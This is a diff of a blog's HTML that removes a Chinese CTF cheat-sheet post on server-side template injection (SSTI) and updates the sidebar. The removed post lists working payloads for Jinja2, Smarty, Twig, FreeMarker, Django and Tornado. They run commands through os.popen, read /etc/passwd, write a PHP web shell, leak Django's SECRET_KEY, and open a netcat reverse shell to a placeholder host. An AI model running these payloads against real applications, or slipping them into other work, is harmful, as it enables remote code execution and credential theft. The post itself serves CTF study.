-  <time class="dt-published" datetime="2021-03-08T01:23:59.000Z" itemprop="datePublished">2021-03-08</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/03/08/CTF-Web-SSTI/">CTF-web-ssti</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>参考：<a target="_blank" rel="noopener" href="https://ca01h.top/Python/pysec/1.Jinja2%E7%9A%84SSTI+Bypass/#%E5%AF%BB%E6%89%BE%E5%88%A9%E7%94%A8%E9%93%BE">https://ca01h.top/Python/pysec/1.Jinja2%E7%9A%84SSTI+Bypass/#%E5%AF%BB%E6%89%BE%E5%88%A9%E7%94%A8%E9%93%BE</a></p>
-<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>python的内置函数</p>
-<h1 id="构造链"><a href="#构造链" class="headerlink" title="构造链"></a>构造链</h1><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>__class__获取内置类对应的类，关注str，dict，tuple，list</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__</span><br><span class="line">&lt;class &#39;str&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__</span><br><span class="line">&lt;class &#39;list&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__</span><br><span class="line">&lt;class &#39;tuple&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__</span><br><span class="line">&lt;class &#39;dict&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__</span><br><span class="line">&lt;class &#39;str&#39;&gt;</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>拿到object基类</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__bases__[0]</span><br><span class="line">&lt;class &#39;object&#39;&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__base__</span><br><span class="line">&lt;class &#39;object&#39;&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[1]</span><br><span class="line">&lt;class &#39;object&#39;&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[-1]</span><br><span class="line">&lt;class &#39;object&#39;&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><p>拿到子类列表</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__bases__[0].__subclasses__()</span><br><span class="line">...一大堆的子类</span><br></pre></td></tr></table></figure>
-<h2 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h2><p>寻找子类中可以getshell的类</p>
-<p>python3的popen（注意要import os）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[80].__init__.__globals__.__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p>python2直接调用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).readlines()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>python2通过linecache调用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].os.popen(&#39;whoami&#39;).read()</span><br></pre></td></tr></table></figure>
-<p>python2和python3通用，通过__builtins__利用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[134].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[134].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[134].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;whoami&#39;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[134].__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-<h1 id="常见模板引擎"><a href="#常见模板引擎" class="headerlink" title="常见模板引擎"></a>常见模板引擎</h1><p>参考：<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig">https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig</a></p>
-<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><p><strong>Smarty</strong></p>
-<p>Smarty算是一种很老的PHP模板引擎了，非常的经典，使用的比较广泛</p>
-<p><strong>Twig</strong></p>
-<p>Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。</p>
-<p><strong>Blade</strong></p>
-<p>Blade 是 Laravel 提供的一个既简单又强大的模板引擎。</p>
-<p>和其他流行的 PHP 模板引擎不一样，Blade 并不限制你在视图中使用原生 PHP 代码。所有 Blade 视图文件都将被编译成原生的 PHP 代码并缓存起来，除非它被修改，否则不会重新编译，这就意味着 Blade 基本上不会给你的应用增加任何额外负担。</p>
-<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><p><strong>JSP</strong></p>
-<p>这个引擎我想应该没人不知道吧，这个应该也是我最初学习的一个模板引擎，非常的经典</p>
-<p><strong>FreeMarker</strong></p>
-<p>FreeMarker是一款模板引擎： 即一种基于模板和要改变的数据， 并用来生成输出文本（HTML网页、电子邮件、配置文件、源代码等）的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。</p>
-<p><strong>Velocity</strong></p>
-<p>Velocity作为历史悠久的模板引擎不单单可以替代JSP作为Java Web的服务端网页模板引擎，而且可以作为普通文本的模板引擎来增强服务端程序文本处理能力。</p>
-<h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><p><strong>Jinja2</strong></p>
-<p>flask jinja2 一直是一起说的，使用非常的广泛，是我学习的第一个模板引擎</p>
-<p><strong>django</strong></p>
-<p>django 应该使用的是专属于自己的一个模板引擎，我这里姑且就叫他 django，我们都知道 django 以快速开发著称，有自己好用的ORM，他的很多东西都是耦合性非常高的，你使用别的就不能发挥出 django 的特性了</p>
-<p><strong>tornado</strong></p>
-<p>tornado 也有属于自己的一套模板引擎，tornado 强调的是异步非阻塞高并发</p>
-<h1 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h1><p>参考：<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig">https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig</a></p>
-<h2 id="smarty"><a href="#smarty" class="headerlink" title="smarty"></a>smarty</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.setCache(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.loadTemplate(&quot;ls&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="freeMarker"><a href="#freeMarker" class="headerlink" title="freeMarker"></a>freeMarker</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;id&quot;) &#125;</span><br></pre></td></tr></table></figure>
-<h2 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8000&#x2F;?email&#x3D;&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;localhost:8000&#x2F;?email&#x3D;&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="Flask-Jinja2"><a href="#Flask-Jinja2" class="headerlink" title="Flask/Jinja2"></a>Flask/Jinja2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;evil&#39;, &#39;w&#39;).write(&#39;from os import system%0aSHELL &#x3D; system&#39;) &#125;&#125;</span><br><span class="line">&#x2F;&#x2F;写文件</span><br><span class="line">&#123;&#123; config.from_pyfile(&#39;&#x2F;tmp&#x2F;evil&#39;) &#125;&#125;</span><br><span class="line">&#x2F;&#x2F;加载system</span><br><span class="line">&#123;&#123; config[&#39;SHELL&#39;](&#39;nc xxxx xx -e &#x2F;bin&#x2F;sh&#39;) &#125;&#125;</span><br><span class="line">&#x2F;&#x2F;执行命令反弹SHELL</span><br></pre></td></tr></table></figure>
-<h2 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;117.78.26.79:31093&#x2F;error?msg&#x3D;&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/03/08/CTF-Web-SSTI/" data-id="ckmadesnb0000y0usboyu9ub7" data-title="CTF-web-ssti" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
     
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
   </nav>
 
 </section>
@@ -1663,7 +2375,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/dev/" style="font-size: 15px;">dev</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E8%AF%BE/" style="font-size: 12.5px;">基础课</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 15px;">密码学</a> <a href="/tags/%E6%91%98%E6%8A%84/" style="font-size: 17.5px;">摘抄</a> <a href="/tags/%E6%96%87%E5%AD%A6/" style="font-size: 10px;">文学</a> <a href="/tags/%E8%80%83%E8%AF%81/" style="font-size: 10px;">考证</a> <a href="/tags/%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0/" style="font-size: 10px;">论文学习</a>
+      <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/dev/" style="font-size: 15px;">dev</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E8%AF%BE/" style="font-size: 12.5px;">基础课</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 17.5px;">密码学</a> <a href="/tags/%E6%91%98%E6%8A%84/" style="font-size: 17.5px;">摘抄</a> <a href="/tags/%E6%96%87%E5%AD%A6/" style="font-size: 10px;">文学</a> <a href="/tags/%E8%80%83%E8%AF%81/" style="font-size: 10px;">考证</a> <a href="/tags/%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0/" style="font-size: 10px;">论文学习</a>
     </div>
   </div>
 
@@ -1672,7 +2384,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li></ul>
     </div>
   </div>
 
@@ -1685,23 +2397,23 @@
       <ul>
         
           <li>
+            <a href="/2021/05/05/%E5%AF%86%E7%A0%81%E5%AD%A6-%E7%AE%97%E6%B3%95%E5%AE%9A%E4%B9%89/">密码学-算法定义</a>
+          </li>
+        
+          <li>
+            <a href="/2021/05/05/%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%E5%AE%9A%E4%B9%89/">密码学-安全模型定义</a>
+          </li>
+        
+          <li>
+            <a href="/2021/04/26/%E6%91%98%E6%8A%84-%E4%BD%9B%E7%A5%96%E9%83%BD%E8%AF%B4%E4%BA%86%E4%BA%9B%E4%BB%80%E4%B9%88/">摘抄-佛祖都说了些什么</a>
+          </li>
+        
+          <li>
             <a href="/2021/03/31/%E5%AF%86%E7%A0%81%E5%AD%A6-%E6%9E%84%E9%80%A0%E5%8F%AF%E8%AF%81%E6%98%8E%E5%AE%89%E5%85%A8%E5%AF%86%E7%A0%81%E6%96%B9%E6%A1%88/">密码学-构造可证明安全密码方案</a>
           </li>
         
           <li>
             <a href="/2021/03/31/%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%AE%89%E5%85%A8%E8%AF%81%E6%98%8E%E5%AD%A6%E4%B9%A0/">密码学-安全证明学习</a>
-          </li>
-        
-          <li>
-            <a href="/2021/03/31/%E5%AF%86%E7%A0%81%E5%AD%A6-%E6%96%B9%E6%A1%88%E6%9E%84%E9%80%A0%E5%AD%A6%E4%B9%A0/">密码学-方案构造学习</a>
-          </li>
-        
-          <li>
-            <a href="/2021/03/30/%E6%91%98%E6%8A%84-%E6%97%A5%E8%AF%AD%E8%AF%AD%E6%B3%95/">摘抄-日语语法</a>
-          </li>
-        
-          <li>
-            <a href="/2021/03/30/%E6%91%98%E6%8A%84-Foundations-of-Cryptography/">摘抄-Foundations of Cryptography</a>
           </li>
         
       </ul>
